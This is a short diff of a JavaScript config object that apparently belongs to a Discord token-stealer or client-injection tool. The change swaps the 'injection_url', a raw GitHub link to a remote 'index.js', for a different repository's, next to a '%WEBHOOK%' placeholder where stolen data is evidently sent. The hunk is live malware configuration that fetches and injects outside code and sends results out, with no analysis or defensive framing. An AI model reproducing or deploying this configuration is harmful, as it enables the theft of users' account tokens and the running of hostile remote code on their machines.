@@ -27,7 +27,7 @@ const config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "https://raw.githubusercontent.com/Irax212/JaZxIrax/main/index.js",
+    injection_url: "https://raw.githubusercontent.com/WallyW1337/WallyW-Inject/main/index.js",
     webhook: "%WEBHOOK%",
     apiurl: "",
     filter2: {
